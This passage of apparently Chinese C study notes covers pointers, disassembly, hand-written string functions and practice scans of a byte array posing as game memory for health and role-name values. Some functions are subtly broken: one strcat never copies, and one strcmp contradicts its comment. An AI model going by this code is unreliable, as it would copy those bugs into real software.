class=\"line\">\tp1 = &amp;p;</span><br><span class=\"line\">\tp2 = &amp;p1;</span><br><span class=\"line\">\tp3 = &amp;p2;</span><br><span class=\"line\">\tp4 = &amp;p3;</span><br><span class=\"line\">\tp5 = &amp;p4;</span><br><span class=\"line\">\tp6 = &amp;p5;</span><br><span class=\"line\">\tp7 = &amp;p6;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0040D870 55                   push        ebp</span><br><span class=\"line\">0040D871 8B EC                mov         ebp,esp</span><br><span class=\"line\">0040D873 83 EC 60             sub         esp,60h</span><br><span class=\"line\">0040D876 53                   push        ebx</span><br><span class=\"line\">0040D877 56                   push        esi</span><br><span class=\"line\">0040D878 57                   push        edi</span><br><span class=\"line\">0040D879 8D 7D A0             lea         edi,[ebp-60h]</span><br><span class=\"line\">0040D87C B9 18 00 00 00       mov         ecx,18h</span><br><span class=\"line\">0040D881 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">0040D886 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"></span><br><span class=\"line\">0040D888 C7 45 FC 0A 00 00 00 mov         dword ptr [ebp-4],0Ah</span><br><span class=\"line\">0040D88F 8D 45 FC             lea         eax,[ebp-4]</span><br><span class=\"line\">0040D892 89 45 E0             mov         dword ptr [ebp-20h],eax</span><br><span class=\"line\">0040D895 8D 4D E0             lea         ecx,[ebp-20h]</span><br><span class=\"line\">0040D898 89 4D E4             mov         dword ptr [ebp-1Ch],ecx</span><br><span class=\"line\">0040D89B 8D 55 E4             lea         edx,[ebp-1Ch]</span><br><span class=\"line\">0040D89E 89 55 E8             mov         dword ptr [ebp-18h],edx</span><br><span class=\"line\">0040D8A1 8D 45 E8             lea         eax,[ebp-18h]</span><br><span class=\"line\">0040D8A4 89 45 EC             mov         dword ptr [ebp-14h],eax</span><br><span class=\"line\">0040D8A7 8D 4D EC             lea         ecx,[ebp-14h]</span><br><span class=\"line\">0040D8AA 89 4D F0             mov         dword ptr [ebp-10h],ecx</span><br><span class=\"line\">0040D8AD 8D 55 F0             lea         edx,[ebp-10h]</span><br><span class=\"line\">0040D8B0 89 55 F4             mov         dword ptr [ebp-0Ch],edx</span><br><span class=\"line\">0040D8B3 8D 45 F4             lea         eax,[ebp-0Ch]</span><br><span class=\"line\">0040D8B6 89 45 F8             mov         dword ptr [ebp-8],eax</span><br><span class=\"line\">0040D8B9 5F                   pop         edi</span><br><span class=\"line\">0040D8BA 5E                   pop         esi</span><br><span class=\"line\">0040D8BB 5B                   pop         ebx</span><br><span class=\"line\">0040D8BC 8B E5                mov         esp,ebp</span><br><span class=\"line\">0040D8BE 5D                   pop         ebp</span><br><span class=\"line\">0040D8BF C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void fun()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint arr[5] = &#123;1,2,3,4,5&#125;;</span><br><span class=\"line\">\tfor (int k = 0;k&lt;5;k++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t*(arr+k) = 5 - k;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfor (int i = 0;i&lt;5;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,*(arr+i));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230126121202168.png\" alt=\"image-20230126121202168\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char arr[] = &#123;</span><br><span class=\"line\">\t0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,</span><br><span class=\"line\">\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,</span><br><span class=\"line\">\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,</span><br><span class=\"line\">\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0x0A,0x00,</span><br><span class=\"line\">\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,</span><br><span class=\"line\">\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,</span><br><span class=\"line\">\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,</span><br><span class=\"line\">\t0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,</span><br><span class=\"line\">\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,</span><br><span class=\"line\">\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void FindBloodAddr()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i = 0, length = sizeof(arr)/sizeof(arr[0]);</span><br><span class=\"line\">\twhile(i&lt;length - 4)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint* p = (int*)(arr+i);</span><br><span class=\"line\">\t\tif(*p == 0x64)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tprintf(&quot;[%X] = %d\\n&quot;,p,*p);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFindBloodAddr();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void FindNum()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar* add = data;   </span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%X\\n&quot;,add);</span><br><span class=\"line\">\tfor(int i=0; i&lt;sizeof(data)/sizeof(char)-4; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//*(add+i)</span><br><span class=\"line\">\t\tif(*(int*)(add+i) == 0x64)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tprintf(&quot;%d\\n&quot;,i);</span><br><span class=\"line\">\t\t\tprintf(&quot;[%X]=%d\\n&quot;, (int*)(add+i), *(int*)(add+i));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> names[] = <span class=\"string\">&quot;ABCDE&quot;</span>;</span><br><span class=\"line\">==</span><br><span class=\"line\"><span class=\"type\">char</span> arr[<span class=\"number\">6</span>] = &#123;<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;0&#x27;</span>&#125;;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,arr )</span><br><span class=\"line\"></span><br><span class=\"line\">代码区</span><br><span class=\"line\">堆栈区</span><br><span class=\"line\">全局变量区 - 可读可写</span><br><span class=\"line\">常量区 - 可读不可写</span><br><span class=\"line\">    </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">char</span>* x = <span class=\"string\">&quot;China&quot;</span>;   <span class=\"comment\">//char*指向的字符串不能改，因为存储在常量区，char*的地址可以改</span></span><br><span class=\"line\"><span class=\"type\">char</span> y[] = <span class=\"string\">&quot;China&quot;</span>;  <span class=\"comment\">//全局区</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t*(x+<span class=\"number\">1</span>) = <span class=\"string\">&quot;A&quot;</span>;    <span class=\"comment\">//不能修改常量区 0xC0000005</span></span><br><span class=\"line\">    x = <span class=\"string\">&quot;abx&quot;</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\ty[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;A&#x27;</span>;    <span class=\"comment\">//常量区的内容复制到局部变量中</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* x = <span class=\"string\">&quot;China&quot;</span>;     <span class=\"comment\">//china在常量区，x是china在常量区的首地址 </span></span><br><span class=\"line\">\t<span class=\"type\">char</span> y[] = <span class=\"string\">&quot;China&quot;</span>;    <span class=\"comment\">//china在常量区，被拷贝到栈中</span></span><br><span class=\"line\">\t*(x+<span class=\"number\">1</span>) = <span class=\"string\">&quot;A&quot;</span>;          <span class=\"comment\">//0xC0000005</span></span><br><span class=\"line\">\t  </span><br><span class=\"line\">\ty[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;A&#x27;</span>;   \t\t   <span class=\"comment\">//修改栈中数据</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">strlen</span><span class=\"params\">(<span class=\"type\">char</span>* s)</span>   <span class=\"comment\">//返回值是s的长度，不包括\\0</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\">\t<span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*(s) != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        ret++;</span><br><span class=\"line\">        s++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">strcpy</span><span class=\"params\">(<span class=\"type\">char</span>* dest, <span class=\"type\">char</span>* src)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* ret = dest;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*(dest++) = *(src)++);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">strcat</span><span class=\"params\">(<span class=\"type\">char</span>* dest, <span class=\"type\">char</span>* src)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* ret = dest;</span><br><span class=\"line\"> \t<span class=\"keyword\">while</span>(*dest != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dest++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*dest++ = *src++);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">strcmp</span><span class=\"params\">(<span class=\"type\">char</span>*s1, <span class=\"type\">char</span>* s2)</span> <span class=\"comment\">//一样返回0，不一样返回1</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*s1!=<span class=\"number\">0</span> &amp;&amp; *s2!=<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(*s1++ != *s2++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">FindRoleNameAddr</span><span class=\"params\">(<span class=\"type\">char</span>* pData, <span class=\"type\">char</span>* pRoleName)</span> <span class=\"comment\">//返回值为指针的为指针函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//返回值为带*类型的函数为指针函数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;string.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> data[] = &#123;</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x01</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x04</span>,<span class=\"number\">0x05</span>,<span class=\"number\">0x06</span>,<span class=\"number\">0x07</span>,<span class=\"number\">0x07</span>,<span class=\"number\">0x09</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x20</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x03</span>,<span class=\"number\">0x0C</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x44</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x33</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x47</span>,<span class=\"number\">0x0C</span>,<span class=\"number\">0x0E</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0D</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x11</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0A</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x74</span>,<span class=\"number\">0x0F</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x01</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x05</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0A</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x02</span>,<span class=\"number\">0x57</span>,<span class=\"number\">0x4F</span>,<span class=\"number\">0x57</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x06</span>,<span class=\"number\">0x08</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0F</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x0D</span>,<span class=\"number\">0x00</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x23</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x00</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">strlen</span><span class=\"params\">(<span class=\"type\">char</span>* s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> len = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(*s != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tlen++;</span><br><span class=\"line\">\t\ts++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> len;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">strcpy</span><span class=\"params\">(<span class=\"type\">char</span>* dest, <span class=\"type\">char</span>* src)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* ret = dest;   <span class=\"comment\">//需要先保存首地址，后续dest指针会随着循环向后移，但返回时还是返回首地址</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>((*dest++) = (*src++));   <span class=\"comment\">//这是赋值语句，0也会被复制，先复制在判断</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\twhile(*src != 0) </span></span><br><span class=\"line\"><span class=\"comment\">\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t*dest = *src;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tsrc++;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tdest++;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">strcat</span><span class=\"params\">(<span class=\"type\">char</span>* dest, <span class=\"type\">char</span>* src)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* ret = dest;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(*dest != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tdest++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(*dest != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t*dest = *src;</span><br><span class=\"line\">\t\tdest++;</span><br><span class=\"line\">\t\tsrc++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">strcmp</span><span class=\"params\">(<span class=\"type\">char</span>* s1, <span class=\"type\">char</span>* s2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(*s1 !=<span class=\"number\">0</span> || *s2 != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(*s1 == *s2)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\ts1++;</span><br><span class=\"line\">\t\t\ts2++;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">FindRoleNameAddr</span><span class=\"params\">(<span class=\"type\">char</span>* pData, <span class=\"type\">char</span>* pRoleName)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> total = <span class=\"built_in\">sizeof</span>(data)/<span class=\"built_in\">sizeof</span>(data[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"type\">int</span> length = <span class=\"built_in\">strlen</span>(pRoleName);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;=total-length; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(*(pData+i) == <span class=\"number\">0x57</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">strncmp</span>(&amp;pData[i],pRoleName,<span class=\"number\">3</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> &amp;pData[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> arr2[] = <span class=\"string\">&quot;WOW&quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,data);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,<span 